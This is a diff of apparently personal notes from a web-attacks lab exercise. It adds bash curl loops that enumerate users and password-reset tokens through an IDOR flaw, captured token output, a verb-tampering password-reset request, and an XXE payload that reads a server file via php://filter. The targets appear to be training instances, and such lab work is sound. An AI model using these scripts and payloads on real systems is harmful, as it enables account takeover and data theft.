@@ -327,25 +327,81 @@ Referer: http://10.129.207.224/blind/
 
 # Web Attacks - Skills Assesment
 
+## IDOR enum user
+```bash 
+#!/bin/bash
+
+for i in {1..101}; do
+    url="http://94.237.63.201:55896/api.php/user/$i"
+    response=$(curl -s "$url" \
+        -H "Host: 94.237.63.201:55896" \\
+        -H "Cookie: PHPSESSID=h4bnfl2gog0so1veesn7fuath6; uid=$i")
+    echo "$response"
+done
+
+```
+
+## IDOR enum token to change password
+
+```bash
+
+#!/bin/bash
+
+for i in {1..101}; do
+    url="http://94.237.63.201:55896/api.php/token/$i"
+    response=$(curl -s "$url" \
+        -H "Host: 94.237.63.201:55896" \\
+        -H "Cookie: PHPSESSID=h4bnfl2gog0so1veesn7fuath6; uid=$i")
+    echo "$i"
+    echo "$response"
+done
+
+```
+
+{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
+
+{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
 
 
-
+# Verb Tampering to bypass checks to reset the password
 
 ```bash 
 
-HEAD /reset.php HTTP/1.1
-Host: 94.237.54.176:36212
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=123456789 HTTP/1.1
+Host: 94.237.63.201:55896
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
 Accept: */*
-Accept-Language: en,en-US;q=0.5
+Origin: http://94.237.63.201:55896
+Referer: http://94.237.63.201:55896/settings.php
 Accept-Encoding: gzip, deflate, br
-Referer: http://94.237.54.176:36212/settings.php
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 64
-Origin: http://94.237.54.176:36212
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=v8hasdq1vfdr5k6cl52p17m6me; uid=52
 Connection: keep-alive
-Cookie: PHPSESSID=7dt378u4935c654a4usfp9d8oi; uid=1
 
-uid=1&token=e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c&password=123456
+```
+
+## XML 
+
+```bash
+POST /addEvent.php HTTP/1.1
+Host: 94.237.63.201:55896
+Content-Length: 261
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://94.237.63.201:55896
+Referer: http://94.237.63.201:55896/event.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=v8hasdq1vfdr5k6cl52p17m6me; uid=52
+Connection: keep-alive
+
+<!DOCTYPE name [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
+            <root>
+            <name>&company;</name>
+            <details>flag</details>
+            <date>2022-06-27</date>
+            </root>
 
 ```
